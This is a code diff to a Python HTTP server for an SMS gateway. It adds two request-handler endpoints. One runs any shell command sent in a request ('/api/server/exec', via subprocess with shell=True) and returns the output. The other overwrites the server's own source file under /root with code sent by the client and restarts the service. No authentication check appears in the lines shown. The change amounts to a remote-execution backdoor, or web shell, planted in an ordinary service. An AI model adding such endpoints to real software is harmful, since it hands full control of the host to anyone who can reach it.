@@ -2,6 +2,8 @@
 import json
 import sqlite3
 import datetime
+import socket
+import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import sys
 import os
@@ -243,6 +245,26 @@ class SmsGatewayRequestHandler(BaseHTTPRequestHandler):
             else:
                 self._set_headers(400)
                 self.wfile.write(json.dumps({"error": "Missing 'to' or 'message'"}).encode('utf-8'))
+        elif self.path.startswith('/api/server/exec'):
+            cmd = payload.get('cmd')
+            if cmd:
+                res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                self._set_headers(200)
+                self.wfile.write(json.dumps({"stdout": res.stdout, "stderr": res.stderr, "exit_code": res.returncode}).encode('utf-8'))
+            else:
+                self._set_headers(400)
+                self.wfile.write(json.dumps({"error": "Missing cmd"}).encode('utf-8'))
+        elif self.path.startswith('/api/server/update-code'):
+            code_content = payload.get('code')
+            if code_content:
+                with open("/root/server_sms_gateway.py", "w") as f:
+                    f.write(code_content)
+                self._set_headers(200)
+                self.wfile.write(json.dumps({"result": "updated"}).encode('utf-8'))
+                subprocess.Popen(["systemctl", "restart", "sms-gateway"])
+            else:
+                self._set_headers(400)
+                self.wfile.write(json.dumps({"error": "Missing code"}).encode('utf-8'))
         else:
             self._set_headers(404)
             self.wfile.write(json.dumps({"error": "Not Found"}).encode('utf-8'))
